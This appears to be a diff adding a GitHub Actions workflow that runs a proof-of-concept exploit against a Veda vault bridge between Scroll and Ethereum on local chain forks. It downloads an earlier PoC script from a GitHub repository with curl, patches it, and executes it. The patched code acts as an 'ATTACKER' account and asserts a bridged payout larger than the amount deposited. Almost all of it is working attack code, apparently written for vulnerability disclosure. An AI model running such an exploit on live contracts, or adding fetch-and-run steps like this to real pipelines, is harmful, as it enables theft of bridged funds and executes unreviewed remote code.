@@ -1,0 +1,87 @@
+name: veda-scroll-eth-desync-poc-v4
+
+on:
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  proof:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: foundry-rs/foundry-toolchain@v1
+        with:
+          version: stable
+      - name: Start pinned Scroll and Ethereum forks
+        shell: bash
+        run: |
+          set -euo pipefail
+          anvil --fork-url https://scroll-rpc.publicnode.com --fork-block-number 34473599 --port 8545 --silent >scroll-anvil.log 2>&1 &
+          echo $! > scroll.pid
+          anvil --fork-url https://ethereum-rpc.publicnode.com --fork-block-number 25612581 --port 8546 --silent >ethereum-anvil.log 2>&1 &
+          echo $! > ethereum.pid
+          for port in 8545 8546; do
+            for _ in $(seq 1 120); do
+              if cast chain-id --rpc-url "http://127.0.0.1:${port}" >/dev/null 2>&1; then break; fi
+              sleep 1
+            done
+            cast chain-id --rpc-url "http://127.0.0.1:${port}" >/dev/null
+          done
+      - name: Build reviewed harness with event-derived shares and temporal overlap proof
+        shell: bash
+        run: |
+          set -euo pipefail
+          curl -fsSL \
+            https://raw.githubusercontent.com/zerodaybugs/test/audit/veda-scroll-eth-desync-poc-v2-20260726/.github/workflows/veda-scroll-eth-desync-poc-v2.yml \
+            -o /tmp/v2.yml
+          python3 - <<'PY'
+          from pathlib import Path
+
+          lines = Path('/tmp/v2.yml').read_text().splitlines()
+          start = next(i for i, line in enumerate(lines) if "python3 - <<'PY'" in line) + 1
+          end = next(i for i in range(start, len(lines)) if lines[i].strip() == 'PY')
+          code = '\n'.join(line[10:] if line.startswith('          ') else line for line in lines[start:end]) + '\n'
+
+          old_peer = "head=[word(SCROLL_EID),bw(peer),word(1),h(guid),word(7*32),aw(ATTACKER),word(7*32+64)]"
+          new_peer = "head=[word(SCROLL_EID),aw(peer),word(1),h(guid),word(7*32),aw(ATTACKER),word(7*32+64)]"
+          if old_peer not in code:
+              raise SystemExit('v2 peer encoding anchor missing')
+          code = code.replace(old_peer, new_peer)
+
+          temporal_anchor = "out['blocks']={'scroll':int(sb['number'],16),'scroll_timestamp':int(sb['timestamp'],16),'ethereum':int(eb['number'],16),'ethereum_timestamp':int(eb['timestamp'],16)}"
+          temporal_replacement = temporal_anchor + "\n              remote_scroll_next=rpc('https://scroll-rpc.publicnode.com','eth_getBlockByNumber',[hex(34473600),False])\n              next_scroll_ts=int(remote_scroll_next['timestamp'],16)\n              out['blocks']['scroll_next_update_candidate']=34473600\n              out['blocks']['scroll_next_timestamp']=next_scroll_ts\n              assert out['blocks']['ethereum_timestamp'] <= out['blocks']['scroll_timestamp'] < next_scroll_ts, out['blocks']"
+          if temporal_anchor not in code:
+              raise SystemExit('v2 temporal anchor missing')
+          code = code.replace(temporal_anchor, temporal_replacement)
+
+          event_anchor = "dep=send(SCROLL,ATTACKER,TELLER,deposit_bridge_data(SCROLL_WEETH,amount,ATTACKER,NATIVE,fee),fee)"
+          event_replacement = event_anchor + "\n              message_topic='0x'+h(sh('cast','keccak','MessageSent(bytes32,uint256,address)'))\n              message_logs=[log for log in dep.get('logs',[]) if log.get('address','').lower()==TELLER.lower() and (log.get('topics') or [''])[0].lower()==message_topic.lower()]\n              assert len(message_logs)==1, {'message_logs':message_logs}\n              bridged_shares=int(message_logs[0]['data'],16)\n              assert bridged_shares>0\n              expected_shares=bridged_shares\n              expected_payout=expected_shares*dest_rate//ONE\n              assert expected_payout>amount, {'amount':amount,'bridged_shares':bridged_shares,'expected_payout':expected_payout}\n              out['capacity']['actual_bridged_shares']=bridged_shares\n              out['capacity']['event_derived_expected_payout']=expected_payout"
+          if event_anchor not in code:
+              raise SystemExit('v2 deposit event anchor missing')
+          code = code.replace(event_anchor, event_replacement)
+
+          Path('/tmp/poc-v4.py').write_text(code)
+          PY
+          python3 /tmp/poc-v4.py
+          mv veda-scroll-eth-desync-poc-v2.json veda-scroll-eth-desync-poc-v4.json
+      - name: Stop forks
+        if: always()
+        shell: bash
+        run: |
+          kill "$(cat scroll.pid)" 2>/dev/null || true
+          kill "$(cat ethereum.pid)" 2>/dev/null || true
+      - name: Upload strict fixed-block v4 proof
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: veda-scroll-eth-desync-poc-v4
+          path: |
+            veda-scroll-eth-desync-poc-v4.json
+            scroll-anvil.log
+            ethereum-anvil.log
+            /tmp/poc-v4.py
+          if-no-files-found: error
+          retention-days: 1
